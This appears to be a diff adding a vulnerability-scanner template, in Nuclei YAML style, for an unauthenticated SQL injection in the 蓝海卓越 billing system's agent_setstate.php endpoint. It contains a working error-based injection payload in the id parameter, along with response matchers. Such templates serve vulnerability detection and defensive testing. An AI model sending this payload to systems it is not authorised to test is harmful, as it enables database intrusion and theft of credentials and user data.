@@ -1,0 +1,29 @@
+id: lanhaizhuoyue-agentsetstate-sql
+
+info:
+  name: 蓝海卓越计费管理系统 agent_setstate.php 接口SQL注入漏洞
+  author: Unknown
+  severity: high
+  description: "蓝海卓越计费管理系统 agent_setstate.php 接口存在远程SQL注入漏洞。攻击者可通过构造恶意SQL语句，在未认证状态下读取数据库敏感信息（如管理员凭据、用户隐私数据），并可能在具备高权限条件下执行任意命令，实现对服务器的控制。该漏洞可被利用进行数据泄露、横向渗透及系统权限提升等攻击行为。\n\n[技术细节] 该漏洞源于用户输入未正确过滤，通过HTTP参数注入恶意负载即可触发。攻击链可能包含：1) 数据库结构探测 2) 敏感数据提取 3) 服务器命令执行。建议立即应用官方安全补丁并部署WAF规则。"
+  tags: 蓝海卓越计费管理系统
+
+http:
+- raw:
+  - |
+    GET /agent_setstate.php?id=(SELECT%202*(IF((SELECT%20*%20FROM%20(SELECT%20CONCAT(0x717a767071,(SELECT%20(ELT(6154=6154,1))),0x7170716a71,0x78))s),%208446744073709551610,%208446744073709551610))) HTTP/1.1
+    Host: {{Hostname}}
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'BIGINT value is out of range in'
+  - type: status
+    status:
+    - 200
+
+
+
+
+
